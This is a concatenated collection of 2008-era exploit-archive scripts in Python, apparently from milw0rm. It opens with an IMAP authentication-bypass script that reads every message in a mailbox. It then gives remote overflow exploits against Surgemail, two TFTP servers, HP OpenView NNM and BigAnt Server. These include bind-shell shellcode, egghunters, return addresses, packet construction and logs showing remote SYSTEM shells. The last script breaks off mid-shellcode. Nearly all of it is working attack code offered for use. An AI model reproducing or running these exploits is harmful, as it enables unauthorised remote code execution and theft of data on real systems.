else:
	M = imaplib.IMAP4_SSL(sys.argv[1])
M.login(sys.argv[2], "\"\tmaster_user=root\tskip_password_check=1\"");
M.select()
print "login succeeded."
typ, data = M.search(None, 'ALL')
k=0
for num in data[0].split():
    typ, data = M.fetch(num, '(RFC822)')
    print 'Message %s\n%s\n' % (num, data[0][1])
    k=k+1
M.close()
M.logout()
print "Messages read: %s" % k

# milw0rm.com [2008-03-14]
#!/usr/bin/python
###############################################################################
#
# NetWin Surgemail 0DAY (IMAP POST AUTH) Remote LIST Universal Exploit 
# Discovered and coded by Matteo Memelli aka ryujin 
# http://www.gray-world.net http://www.be4mind.com
#
# Affected Versions : Version 3.8k4-4 Windows Platform
# Tested on OS      : Windows 2000 SP4 English
#                     Windows XP Sp2 English
#                     Windows 2003 Standard Edition Italian
# Discovery Date    : 03/13/2008
#
#-----------------------------------------------------------------------------
#
# Thx to muts _[at]_ offensive-security.com 
# for the "Partial Overwrite" Suggestion  :)  Now I know it works!
#
#-----------------------------------------------------------------------------
##############################################################################
#
# matte@badrobot:~/surgemail$ ./surgemail_list.py -H 192.168.1.245 -P 143 -l \
# test -p test
#
# [*********************************************************************]
# [*                                                                   *]
# [*    NetWin Surgemail 0DAY (IMAP POST AUTH) Remote LIST Exploit     *]
# [*                      Discovered and Coded By                      *]
# [*                          Matteo Memelli                           *]
# [*                             (ryujin)                              *]
# [*              www.be4mind.com - www.gray-world.net                 *]
# [*                                                                   *]
# [*********************************************************************]
# [+] Connecting to imap server...
# * OK IMAP ryujin (Version 3.8k4-4)
#
# [+] Logging in...
# 0001 OK  LOGIN completed
#
# [+] PWNING IN PROGRESS  :)  ...
# [+] DONE! Check your shell on 192.168.1.245:4444
# matte@badrobot:~/surgemail$ nc 192.168.1.245 4444
# Microsoft Windows XP [Version 5.1.2600]
# (C) Copyright 1985-2001 Microsoft Corp.
#
# c:\surgemail>ipconfig
# ipconfig
#
# Windows IP Configuration
#
#
# Ethernet adapter Local Area Connection:
#
#        Connection-specific DNS Suffix  . : 
#        IP Address. . . . . . . . . . . . : 192.168.1.245
#        Subnet Mask . . . . . . . . . . . : 255.255.255.0
#        Default Gateway . . . . . . . . . : 192.168.1.197
#
# c:\surgemail>
#
##############################################################################

from socket import *
from optparse import OptionParser
import sys, time

print "[*********************************************************************]"
print "[*                                                                   *]"
print "[*    NetWin Surgemail 0DAY (IMAP POST AUTH) Remote LIST Exploit     *]"
print "[*                      Discovered and Coded By                      *]"
print "[*                          Matteo Memelli                           *]" 
print "[*                             (ryujin)                              *]" 
print "[*              www.be4mind.com - www.gray-world.net                 *]"
print "[*                                                                   *]"
print "[*********************************************************************]"
usage =  "%prog -H TARGET_HOST -P TARGET_PORT -l USER -p PASSWD"
parser = OptionParser(usage=usage)
parser.add_option("-H", "--target_host", type="string",
                  action="store", dest="HOST",
                  help="Target Host")
parser.add_option("-P", "--target_port", type="int",
                  action="store", dest="PORT",
                  help="Target Port")
parser.add_option("-l", "--login-user", type="string",
                  action="store", dest="USER",
                  help="User login")
parser.add_option("-p", "--login-password", type="string",
                  action="store", dest="PASSWD",
                  help="User password")
(options, args) = parser.parse_args()
HOST    = options.HOST
PORT    = options.PORT
USER    = options.USER
PASSWD  = options.PASSWD
if not (HOST and PORT and USER and PASSWD):
   parser.print_help()
   sys.exit()

NOPES     = "\x90"*9654
SJUMP     = "\xEB\xF9\x90\x90"     # Jmp Back
NJUMP     = "\xE9\xDD\xD7\xFF\xFF" # And Back Again Baby  ;) 
# Partial Overwrite: 0x00 not allowed in buffer and all poppopret
# begin with 0x00 in surgemail.exe 
RET       = "\x7e\x51\x78"         
SHELLCODE = (
#[*] x86/alpha_mixed succeeded, final size 697
"\x89\xe0\xd9\xeb\xd9\x70\xf4\x59\x49\x49\x49\x49\x49\x49\x49"
"\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a\x41"
"\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42"
"\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x4b"
"\x4c\x43\x5a\x4a\x4b\x50\x4d\x4d\x38\x4b\x49\x4b\x4f\x4b\x4f"
"\x4b\x4f\x43\x50\x4c\x4b\x42\x4c\x47\x54\x46\x44\x4c\x4b\x50"
"\x45\x47\x4c\x4c\x4b\x43\x4c\x44\x45\x44\x38\x45\x51\x4a\x4f"
"\x4c\x4b\x50\x4f\x42\x38\x4c\x4b\x51\x4f\x51\x30\x43\x31\x4a"
"\x4b\x50\x49\x4c\x4b\x46\x54\x4c\x4b\x45\x51\x4a\x4e\x50\x31"
"\x49\x50\x4c\x59\x4e\x4c\x4b\x34\x49\x50\x42\x54\x44\x47\x49"
"\x51\x48\x4a\x44\x4d\x43\x31\x49\x52\x4a\x4b\x4b\x44\x47\x4b"
"\x50\x54\x51\x34\x47\x58\x44\x35\x4a\x45\x4c\x4b\x51\x4f\x46"
"\x44\x45\x51\x4a\x4b\x45\x36\x4c\x4b\x44\x4c\x50\x4b\x4c\x4b"
"\x51\x4f\x45\x4c\x45\x51\x4a\x4b\x43\x33\x46\x4c\x4c\x4b\x4b"
"\x39\x42\x4c\x51\x34\x45\x4c\x43\x51\x48\x43\x46\x51\x49\x4b"
"\x43\x54\x4c\x4b\x51\x53\x50\x30\x4c\x4b\x51\x50\x44\x4c\x4c"
"\x4b\x44\x30\x45\x4c\x4e\x4d\x4c\x4b\x51\x50\x45\x58\x51\x4e"
"\x43\x58\x4c\x4e\x50\x4e\x44\x4e\x4a\x4c\x46\x30\x4b\x4f\x4e"
"\x36\x42\x46\x46\x33\x43\x56\x42\x48\x47\x43\x46\x52\x45\x38"
"\x44\x37\x44\x33\x46\x52\x51\x4f\x46\x34\x4b\x4f\x4e\x30\x45"
"\x38\x48\x4b\x4a\x4d\x4b\x4c\x47\x4b\x50\x50\x4b\x4f\x48\x56"
"\x51\x4f\x4d\x59\x4d\x35\x43\x56\x4b\x31\x4a\x4d\x45\x58\x45"
"\x52\x46\x35\x43\x5a\x44\x42\x4b\x4f\x4e\x30\x45\x38\x48\x59"
"\x45\x59\x4a\x55\x4e\x4d\x46\x37\x4b\x4f\x49\x46\x51\x43\x46"
"\x33\x50\x53\x51\x43\x51\x43\x50\x43\x50\x53\x47\x33\x46\x33"
"\x4b\x4f\x48\x50\x45\x36\x45\x38\x42\x31\x51\x4c\x43\x56\x51"
"\x43\x4d\x59\x4d\x31\x4a\x35\x45\x38\x4e\x44\x45\x4a\x42\x50"
"\x48\x47\x46\x37\x4b\x4f\x49\x46\x43\x5a\x42\x30\x46\x31\x46"
"\x35\x4b\x4f\x4e\x30\x43\x58\x49\x34\x4e\x4d\x46\x4e\x4b\x59"
"\x46\x37\x4b\x4f\x48\x56\x50\x53\x51\x45\x4b\x4f\x4e\x30\x43"
"\x58\x4b\x55\x50\x49\x4b\x36\x47\x39\x51\x47\x4b\x4f\x48\x56"
"\x46\x30\x50\x54\x46\x34\x46\x35\x4b\x4f\x4e\x30\x4d\x43\x45"
"\x38\x4a\x47\x42\x59\x48\x46\x44\x39\x50\x57\x4b\x4f\x4e\x36"
"\x50\x55\x4b\x4f\x4e\x30\x43\x56\x42\x4a\x42\x44\x45\x36\x45"
"\x38\x45\x33\x42\x4d\x4b\x39\x4d\x35\x43\x5a\x50\x50\x46\x39"
"\x51\x39\x48\x4c\x4c\x49\x4d\x37\x42\x4a\x51\x54\x4b\x39\x4d"
"\x32\x50\x31\x49\x50\x4a\x53\x4e\x4a\x4b\x4e\x47\x32\x46\x4d"
"\x4b\x4e\x47\x32\x46\x4c\x4d\x43\x4c\x4d\x43\x4a\x46\x58\x4e"
"\x4b\x4e\x4b\x4e\x4b\x45\x38\x42\x52\x4b\x4e\x48\x33\x42\x36"
"\x4b\x4f\x43\x45\x47\x34\x4b\x4f\x48\x56\x51\x4b\x50\x57\x51"
"\x42\x50\x51\x46\x31\x46\x31\x42\x4a\x43\x31\x46\x31\x50\x51"
"\x51\x45\x46\x31\x4b\x4f\x48\x50\x43\x58\x4e\x4d\x4e\x39\x43"
"\x35\x48\x4e\x50\x53\x4b\x4f\x4e\x36\x42\x4a\x4b\x4f\x4b\x4f"
"\x50\x37\x4b\x4f\x4e\x30\x4c\x4b\x51\x47\x4b\x4c\x4c\x43\x49"
"\x54\x45\x34\x4b\x4f\x49\x46\x51\x42\x4b\x4f\x48\x50\x45\x38"
"\x4a\x4f\x48\x4e\x4d\x30\x45\x30\x51\x43\x4b\x4f\x49\x46\x4b"
"\x4f\x4e\x30\x44\x4a\x41\x41")

s = socket(AF_INET, SOCK_STREAM)
print " [+] Connecting to imap server..."
s.connect((HOST, PORT))
print s.recv(1024)
print " [+] Logging in..."
s.send("0001 LOGIN %s %s\r\n" % (USER, PASSWD))
print s.recv(1024)
print " [+] PWNING IN PROGRESS  :)  ..."
EVIL = NOPES + SHELLCODE + NJUMP + SJUMP + RET
s.send('0002 LIST () "/' + EVIL + '" "PWNED"\r\n')
print " [+] DONE! Check your shell on %s:%d" % (HOST, 4444)
s.close()

# milw0rm.com [2008-03-14]
#!/usr/bin/python
# TFTP Server for Windows V1.4 ST (0day)
# http://sourceforge.net/projects/tftp-server/
# Tested on Windows Vista SP0.
# Coded by Mati Aharoni
# muts..at..offensive-security.com
# http://www.offensive-security.com/0day/sourceforge-tftpd.py.txt
##################################################################
# bt ~ # sourceforge-tftpd.py
# [*] TFTP Server for Windows V1.4 ST (0day)
# [*] http://www.offensive-security.com
# [*] Sending evil packet, ph33r
# [*] Check port 4444 for bindshell
# bt ~ # nc -v 172.16.167.134 4444
# (UNKNOWN) [172.16.167.134] 4444 (krb524) open
# Microsoft Windows [Version 6.0.6000]
# Copyright (c) 2006 Microsoft Corporation.  All 
# rights reserved.
#
# C:\Windows\system32>
##################################################################

import socket
import sys

print "[*] TFTP Server for Windows V1.4 ST (0day)"
print "[*] http://www.offensive-security.com"

host = '172.16.167.134'
port = 69

try:
   s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
except:
   print "socket() failed"
   sys.exit(1)

# Jump back shellcode
sc = "\x6a\x05\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x16\x91\x9c"
sc +="\x30\x83\xeb\xfc\xe2\xf4\xcf\x7f\x45\x44\x32\x65\xc5\xb0\xd7\x9b"
sc +="\x0c\xce\xdb\x6f\x51\xcf\xf7\x91\x9c\x30"

# windows/shell_bind_tcp - 317 bytes
# http://www.metasploit.com
# EXITFUNC=seh, LPORT=4444

shell=("\xfc\x6a\xeb\x4d\xe8\xf9\xff\xff\xff\x60\x8b\x6c\x24\x24\x8b"
"\x45\x3c\x8b\x7c\x05\x78\x01\xef\x8b\x4f\x18\x8b\x5f\x20\x01"
"\xeb\x49\x8b\x34\x8b\x01\xee\x31\xc0\x99\xac\x84\xc0\x74\x07"
"\xc1\xca\x0d\x01\xc2\xeb\xf4\x3b\x54\x24\x28\x75\xe5\x8b\x5f"
"\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb\x03\x2c\x8b"
"\x89\x6c\x24\x1c\x61\xc3\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c"
"\x8b\x70\x1c\xad\x8b\x40\x08\x5e\x68\x8e\x4e\x0e\xec\x50\xff"
"\xd6\x66\x53\x66\x68\x33\x32\x68\x77\x73\x32\x5f\x54\xff\xd0"
"\x68\xcb\xed\xfc\x3b\x50\xff\xd6\x5f\x89\xe5\x66\x81\xed\x08"
"\x02\x55\x6a\x02\xff\xd0\x68\xd9\x09\xf5\xad\x57\xff\xd6\x53"
"\x53\x53\x53\x53\x43\x53\x43\x53\xff\xd0\x66\x68\x11\x5c\x66"
"\x53\x89\xe1\x95\x68\xa4\x1a\x70\xc7\x57\xff\xd6\x6a\x10\x51"
"\x55\xff\xd0\x68\xa4\xad\x2e\xe9\x57\xff\xd6\x53\x55\xff\xd0"
"\x68\xe5\x49\x86\x49\x57\xff\xd6\x50\x54\x54\x55\xff\xd0\x93"
"\x68\xe7\x79\xc6\x79\x57\xff\xd6\x55\xff\xd0\x66\x6a\x64\x66"
"\x68\x63\x6d\x89\xe5\x6a\x50\x59\x29\xcc\x89\xe7\x6a\x44\x89"
"\xe2\x31\xc0\xf3\xaa\xfe\x42\x2d\xfe\x42\x2c\x93\x8d\x7a\x38"
"\xab\xab\xab\x68\x72\xfe\xb3\x16\xff\x75\x44\xff\xd6\x5b\x57"
"\x52\x51\x51\x51\x6a\x01\x51\x51\x55\x51\xff\xd0\x68\xad\xd9"
"\x05\xce\x53\xff\xd6\x6a\xff\xff\x37\xff\xd0\x8b\x57\xfc\x83"
"\xc4\x64\xff\xd6\x52\xff\xd0\x68\xf0\x8a\x04\x5f\x53\xff\xd6"
"\xff\xd0")

filename = "\x90"*860 + shell + "\x90"*14 + sc + "\xeb\xd0\x90\x90" + "\x2b\x0e\x41"

mode = "netascii"

muha = "\x00\x02" + filename+ "\0" + mode+ "\0" 

print "[*] Sending evil packet, ph33r"
s.sendto(muha, (host, port))
print "[*] Check port 4444 for bindshell"

# milw0rm.com [2008-03-26]
#!/usr/bin/python
# Quick TFTP Pro 2.1 SEH Overflow (0day)
# Tested on Windows XP SP2. 
# Coded by Mati Aharoni
# muts..at..offensive-security.com
# http://www.offensive-security.com/0day/quick-tftp-poc.py.txt
#########################################################
# bt ~ # quickftp.py
# [*] Quick TFTP Pro 2.1 SEH Overflow (0day)
# [*] http://www.offensive-security.com
# [*] Sending evil packet, ph33r
# [*] Check port 4444 for bindshell
# bt ~ # nc -v 172.16.167.130 4444
# (UNKNOWN) [172.16.167.130] 4444 (krb524) open
# Microsoft Windows XP [Version 5.1.2600]
# (C) Copyright 1985-2001 Microsoft Corp.
#
# C:\Documents and Settings\Administrator>
##########################################################
import socket
import sys

print "[*] Quick TFTP Pro 2.1 SEH Overflow (0day)"
print "[*] http://www.offensive-security.com"

host = '172.16.167.134'
port = 69

try:
   s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
except:
   print "socket() failed"
   sys.exit(1)

filename = "pwnd"

# windows/shell_bind_tcp - 317 bytes
# http://www.metasploit.com
# EXITFUNC=thread, LPORT=4444

shell=("\xfc\x6a\xeb\x4d\xe8\xf9\xff\xff\xff\x60\x8b\x6c\x24\x24\x8b"
"\x45\x3c\x8b\x7c\x05\x78\x01\xef\x8b\x4f\x18\x8b\x5f\x20\x01"
"\xeb\x49\x8b\x34\x8b\x01\xee\x31\xc0\x99\xac\x84\xc0\x74\x07"
"\xc1\xca\x0d\x01\xc2\xeb\xf4\x3b\x54\x24\x28\x75\xe5\x8b\x5f"
"\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb\x03\x2c\x8b"
"\x89\x6c\x24\x1c\x61\xc3\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c"
"\x8b\x70\x1c\xad\x8b\x40\x08\x5e\x68\x8e\x4e\x0e\xec\x50\xff"
"\xd6\x66\x53\x66\x68\x33\x32\x68\x77\x73\x32\x5f\x54\xff\xd0"
"\x68\xcb\xed\xfc\x3b\x50\xff\xd6\x5f\x89\xe5\x66\x81\xed\x08"
"\x02\x55\x6a\x02\xff\xd0\x68\xd9\x09\xf5\xad\x57\xff\xd6\x53"
"\x53\x53\x53\x53\x43\x53\x43\x53\xff\xd0\x66\x68\x11\x5c\x66"
"\x53\x89\xe1\x95\x68\xa4\x1a\x70\xc7\x57\xff\xd6\x6a\x10\x51"
"\x55\xff\xd0\x68\xa4\xad\x2e\xe9\x57\xff\xd6\x53\x55\xff\xd0"
"\x68\xe5\x49\x86\x49\x57\xff\xd6\x50\x54\x54\x55\xff\xd0\x93"
"\x68\xe7\x79\xc6\x79\x57\xff\xd6\x55\xff\xd0\x66\x6a\x64\x66"
"\x68\x63\x6d\x89\xe5\x6a\x50\x59\x29\xcc\x89\xe7\x6a\x44\x89"
"\xe2\x31\xc0\xf3\xaa\xfe\x42\x2d\xfe\x42\x2c\x93\x8d\x7a\x38"
"\xab\xab\xab\x68\x72\xfe\xb3\x16\xff\x75\x44\xff\xd6\x5b\x57"
"\x52\x51\x51\x51\x6a\x01\x51\x51\x55\x51\xff\xd0\x68\xad\xd9"
"\x05\xce\x53\xff\xd6\x6a\xff\xff\x37\xff\xd0\x8b\x57\xfc\x83"
"\xc4\x64\xff\xd6\x52\xff\xd0\x68\xef\xce\xe0\x60\x53\xff\xd6"
"\xff\xd0")

mode = "A"*1019+"\xeb\x08\x90\x90"+"\x58\x14\xd3\x74"+"\x90"*16+shell

muha = "\x00\x02" + filename+ "\0" + mode + "\0" 

print "[*] Sending evil packet, ph33r"
s.sendto(muha, (host, port))
print "[*] Check port 4444 for bindshell"

# milw0rm.com [2008-03-26]
#!/usr/bin/python
################################################################################
# HP OpenView NNM 7.5.1 OVAS.EXE Pre Authentication SEH Overflow
# Tested on Windows 2003 Server SP1.
# Coded by Mati Aharoni
# muts..at..offensive-security.com
# http://www.offensive-security.com/0day/hp-nnm-ov.py.txt
# [shameless plug]
# This vulnerability was found, analysed and exploited
# as part of a training module in "BackTrack to the Max".
# http://www.offensive-security.com/ilt.php
# [/shameless plug]
#################################################################################
# bt 0day# python hp-nnm-ov.py
# [*] HP NNM 7.5.1 OVAS.exe SEH PRE AUTH Overflow Exploit (0day)
# [*] http://www.offensive-security.com
# [*] Sending evil HTTP request to NNMz, ph33r
# [*] Egghunter working ...
# [*] Check payload results - may take up to a minute.
# bt 0day# nc -v 192.168.1.111 4444
# (muts) [192.168.1.111] 4444 (krb524) open
# Microsoft Windows [Version 5.2.3790]
# (C) Copyright 1985-2003 Microsoft Corp.
#
# C:\>whoami
# whoami
# nt authority\system
#
# C:\>
#
################################################################################
# Insane, "We own all those registers, but how the heck do we get EIP"  method.
################################################################################
# crash = "T"*1300
#
#################################################################################
# Funky, "Lets make the stack happy and pray for EIP" overwrite method.
#################################################################################
# Case  1 - Stack not happy:
# crash = "T"*989
#
# Case 2 - Stack happy, we own EIP - blessed by the angels above:
# 0x44442638 - Happy NNM address
# crash = "T"*941 +"\x38\x26\x44\x44"+"\x42\x42\x42\x42" +"T"*12 +"\x41\x41\x41\x41" + "T"*24+":7510"+"\x41\x41\x41\x41" + "B"*24+":7510"
# 12 bytes of nasty strict alphanum shellcode possibility @EBP
#
################################################################################
# Unknown "wtf, these bytes are expanding" SEH method:
################################################################################
# 0x6d356c6e - POP POP RET somewhere in NNM
# crash = "\xeb"*1100+"A"*9+"\x41\x41\x41\x41"+"A"*1900+":7510"
#
################################################################################
# Final exploit crash SEH method:
################################################################################
# crash = "\xeb"*1101 +"\x41\x41\x41\x41\x77\x21\x6e\x6c\x35\x6d" + "G"*32 + egghunter +"A"*100+":7510"
#
################################################################################

import socket
import os
import sys

print "[*] HP NNM 7.5.1 OVAS.exe SEH Overflow Exploit (0day)"
print "[*] http://www.offensive-security.com"

# Alphanumeric egghunter shellcode + restricted chars \x40\x3f\x3a\x2f - ph33r
# One egg to rule them all.

egghunter=(
"%JMNU%521*TX-1MUU-1KUU-5QUUP\AA%J"
"MNU%521*-!UUU-!TUU-IoUmPAA%JMNU%5"
"21*-q!au-q!au-oGSePAA%JMNU%521*-D"
"A~X-D4~X-H3xTPAA%JMNU%521*-qz1E-1"
"z1E-oRHEPAA%JMNU%521*-3s1--331--^"
"TC1PAA%JMNU%521*-E1wE-E1GE-tEtFPA"
"A%JMNU%521*-R222-1111-nZJ2PAA%JMN"
"U%521*-1-wD-1-wD-8$GwP")

alignstack="\x90"*34+"\x83\xc4\x03"

# win32_bind - EXITFUNC=thread LPORT=4444 Size=709 Encoder=PexAlphaNum http://metasploit.com
# Spawned shell dies quickly as a result of a parent thread killing it.
# Best shellcodes are of the "instant" type, such as adduser, etc.

bindshell=("T00WT00W" + alignstack +
"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
"\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
"\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
"\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
"\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4c\x56\x4b\x4e"
"\x4d\x34\x4a\x4e\x49\x4f\x4f\x4f\x4f\x4f\x4f\x4f\x42\x36\x4b\x48"
"\x4e\x46\x46\x32\x46\x42\x4b\x48\x45\x54\x4e\x33\x4b\x38\x4e\x37"
"\x45\x30\x4a\x37\x41\x30\x4f\x4e\x4b\x38\x4f\x54\x4a\x41\x4b\x48"
"\x4f\x35\x42\x32\x41\x50\x4b\x4e\x49\x34\x4b\x58\x46\x43\x4b\x58"
"\x41\x30\x50\x4e\x41\x33\x42\x4c\x49\x49\x4e\x4a\x46\x48\x42\x4c"
"\x46\x47\x47\x50\x41\x4c\x4c\x4c\x4d\x30\x41\x30\x44\x4c\x4b\x4e"
"\x46\x4f\x4b\x53\x46\x55\x46\x32\x4a\x32\x45\x37\x45\x4e\x4b\x48"
"\x4f\x35\x46\x52\x41\x30\x4b\x4e\x48\x46\x4b\x58\x4e\x30\x4b\x54"
"\x4b\x58\x4f\x35\x4e\x51\x41\x50\x4b\x4e\x43\x50\x4e\x32\x4b\x38"
"\x49\x58\x4e\x46\x46\x52\x4e\x31\x41\x56\x43\x4c\x41\x53\x4b\x4d"
"\x46\x46\x4b\x58\x43\x44\x42\x33\x4b\x38\x42\x54\x4e\x30\x4b\x48"
"\x42\x47\x4e\x51\x4d\x4a\x4b\x48\x42\x34\x4a\x50\x50\x35\x4a\x36"
"\x50\x38\x50\x54\x50\x50\x4e\x4e\x42\x35\x4f\x4f\x48\x4d\x48\x56"
"\x43\x55\x48\x56\x4a\x46\x43\x53\x44\x43\x4a\x36\x47\x57\x43\x57"
"\x44\x33\x4f\x35\x46\x55\x4f\x4f\x42\x4d\x4a\x56\x4b\x4c\x4d\x4e"
"\x4e\x4f\x4b\x53\x42\x55\x4f\x4f\x48\x4d\x4f\x45\x49\x38\x45\x4e"
"\x48\x56\x41\x38\x4d\x4e\x4a\x50\x44\x30\x45\x45\x4c\x46\x44\x30"
"\x4f\x4f\x42\x4d\x4a\x46\x49\x4d\x49\x50\x45\x4f\x4d\x4a\x47\x55"
"\x4f\x4f\x48\x4d\x43\x55\x43\x55\x43\x55\x43\x55\x43\x45\x43\x44"
"\x43\x35\x43\x54\x43\x55\x4f\x4f\x42\x4d\x48\x36\x4a\x46\x41\x31"
"\x4e\x55\x48\x46\x43\x55\x49\x58\x41\x4e\x45\x59\x4a\x56\x46\x4a"
"\x4c\x51\x42\x37\x47\x4c\x47\x35\x4f\x4f\x48\x4d\x4c\x56\x42\x51"
"\x41\x35\x45\x45\x4f\x4f\x42\x4d\x4a\x56\x46\x4a\x4d\x4a\x50\x32"
"\x49\x4e\x47\x35\x4f\x4f\x48\x4d\x43\x35\x45\x35\x4f\x4f\x42\x4d"
"\x4a\x56\x45\x4e\x49\x34\x48\x48\x49\x44\x47\x45\x4f\x4f\x48\x4d"
"\x42\x55\x46\x55\x46\x35\x45\x45\x4f\x4f\x42\x4d\x43\x59\x4a\x46"
"\x47\x4e\x49\x57\x48\x4c\x49\x37\x47\x55\x4f\x4f\x48\x4d\x45\x45"
"\x4f\x4f\x42\x4d\x48\x56\x4c\x56\x46\x56\x48\x46\x4a\x46\x43\x56"
"\x4d\x36\x49\x58\x45\x4e\x4c\x56\x42\x45\x49\x45\x49\x42\x4e\x4c"
"\x49\x38\x47\x4e\x4c\x36\x46\x44\x49\x38\x44\x4e\x41\x33\x42\x4c"
"\x43\x4f\x4c\x4a\x50\x4f\x44\x54\x4d\x52\x50\x4f\x44\x44\x4e\x32"
"\x43\x39\x4d\x38\x4c\x37\x4a\x43\x4b\x4a\x4b\x4a\x4b\x4a\x4a\x46"
"\x44\x57\x50\x4f\x43\x4b\x48\x41\x4f\x4f\x45\x57\x46\x44\x4f\x4f"
"\x48\x4d\x4b\x35\x47\x45\x44\x55\x41\x55\x41\x55\x41\x35\x4c\x56"
"\x41\x50\x41\x55\x41\x45\x45\x35\x41\x45\x4f\x4f\x42\x4d\x4a\x56"
"\x4d\x4a\x49\x4d\x45\x30\x50\x4c\x43\x35\x4f\x4f\x48\x4d\x4c\x36"
"\x4f\x4f\x4f\x4f\x47\x53\x4f\x4f\x42\x4d\x4b\x38\x47\x55\x4e\x4f"
"\x43\x48\x46\x4c\x46\x56\x4f\x4f\x48\x4d\x44\x55\x4f\x4f\x42\x4d"
"\x4a\x56\x4f\x4e\x50\x4c\x42\x4e\x42\x56\x43\x35\x4f\x4f\x48\x4d"
"\x4f\x4f\x42\x4d\x5a")

# 0x6d356c6e pop pot ret somehwere in NNM 7.5.1

evilcrash = "\xeb"*1101 + "\x41\x41\x41\x41\x77\x21\x6e\x6c\x35\x6d" + "G"*32 +egghunter + "A"*100 + ":7510"

buffer="GET http://" + evilcrash+ "/topology/homeBaseView HTTP/1.1\r\n"
buffer+="Content-Type: application/x-www-form-urlencoded\r\n"
buffer+="User-Agent: Mozilla/4.0 (Windows XP 5.1) Java/1.6.0_03\r\n"
buffer+="Content-Length: 1048580\r\n\r\n"
buffer+= bindshell 

print "[*] Sending evil HTTP request to NNMz, ph33r"
expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect(("192.168.1.111", 7510))
expl.send(buffer)
expl.close()
print "[*] Egghunter working ..."
print "[*] Check payload results - may take up to a minute."

# milw0rm.com [2008-04-02]
#!/usr/bin/python
###############################################################################
# BigAnt Server Ver 2.2 PreAuth Remote SEH Overflow (0day)
# Matteo Memelli aka ryujin
# www.be4mind.com - www.gray-world.net
# 04/13/2008
# Tested on Windows 2000 Sp4 English
# Vulnerable process is AntServer.exe 
# Offset for SEH overwrite is 954 Bytes
#
#------------------------------------------------------------------------------
#            muts you gave me the wrong pill! it's your fault!!! 
#                      I wanna go back to the matrix
#------------------------------------------------------------------------------
#
# bt ~ # ./antserver_exploit.py -H 192.168.1.195 -P 6080
# [+] Connecting to host...
# [+] Overflowing the buffer...
# [+] Done! Check your shell on 192.168.1.195:6080
# bt ~ # nc -vv 192.168.1.195 4444
# 192.168.1.195: inverse host lookup failed: Unknown host
# (UNKNOWN) [192.168.1.195] 4444 (krb524) open
# Microsoft Windows 2000 [Version 5.00.2195]
# (C) Copyright 1985-2000 Microsoft Corp.
#
# C:\WINNT\system32>
#
###############################################################################
from socket import *
from optparse import OptionParser
import sys

print "[*********************************************************************]"
print "[*                                                                   *]"
print "[*         BigAnt Server PreAuth Remote SEH Overflow (0day)          *]"
print "[*                      Discovered and Coded By                      *]"
print "[*                          Matteo Memelli                           *]" 
print "[*                             (ryujin)                              *]" 
print "[*              www.be4mind.com - www.gray-world.net                 *]"
print "[*                                                                   *]"
print "[*********************************************************************]"
usage =  "%prog -H TARGET_HOST -P TARGET_PORT"
parser = OptionParser(usage=usage)
parser.add_option("-H", "--target_host", type="string",
                  action="store", dest="HOST",
                  help="Target Host")
parser.add_option("-P", "--target_port", type="int",
                  action="store", dest="PORT",
                  help="Target Port")
(options, args) = parser.parse_args()
HOST    = options.HOST
PORT    = options.PORT
if not (HOST and PORT):
   parser.print_help()
   sys.exit()

# Tried with SEH/THREAD/PROCESS but server crashes anyway
# [*] x86/alpha_mixed succeeded, final size 698 SEH
shellcode = (
"\x89\xe1\xda\xc0\xd9\x71\xf4\x58\x50\x59\x49\x49\x49\x49\x49"
"\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a"
"\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32"
"\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
"\x4b\x4c\x43\x5a\x4a\x4b\x50\x4d\x4b\x58\x4a\x59\x4b\x4f\x4b"
"\x4f\x4b\x4f\x43\x50\x4c\x4b\x42\x4c\x47\x54\x47\x54\x4c\x4b"
"\x47\x35\x47\x4c\x4c\x4b\x43\x4c\x44\x45\x43\x48\x45\x51\x4a"
"\x4f\x4c\x4b\x50\x4f\x44\x58\x4c\x4b\x51\x4f\x51\x30\x45\x51"
"\x4a\x4b\x47\x39\x4c\x4b\x50\x34\x4c\x4b\x43\x31\x4a\x4e\x46"
"\x51\x49\x50\x4a\x39\x4e\x4c\x4d\x54\x49\x50\x42\x54\x44\x47"
"\x49\x51\x49\x5a\x44\x4d\x43\x31\x49\x52\x4a\x4b\x4c\x34\x47"
"\x4b\x46\x34\x47\x54\x47\x58\x42\x55\x4b\x55\x4c\x4b\x51\x4f"
"\x46\x44\x43\x31\x4a\x4b\x43\x56\x4c\x4b\x44\x4c\x50\x4b\x4c"
"\x4b\x51\x4f\x45\x4c\x43\x31\x4a\x4b\x44\x43\x46\x4c\x4c\x4b"
"\x4d\x59\x42\x4c\x47\x54\x45\x4c\x45\x31\x49\x53\x50\x31\x49"
"\x4b\x42\x44\x4c\x4b\x47\x33\x50\x30\x4c\x4b\x47\x30\x44\x4c"
"\x4c\x4b\x44\x30\x45\x4c\x4e\x4d\x4c\x4b\x47\x30\x43\x38\x51"
"\x4e\x45\x38\x4c\x4e\x50\x4e\x44\x4e\x4a\x4c\x50\x50\x4b\x4f"
"\x4e\x36\x42\x46\x51\x43\x42\x46\x43\x58\x47\x43\x50\x32\x42"
"\x48\x42\x57\x43\x43\x50\x32\x51\x4f\x51\x44\x4b\x4f\x4e\x30"
"\x43\x58\x48\x4b\x4a\x4d\x4b\x4c\x47\x4b\x46\x30\x4b\x4f\x4e"
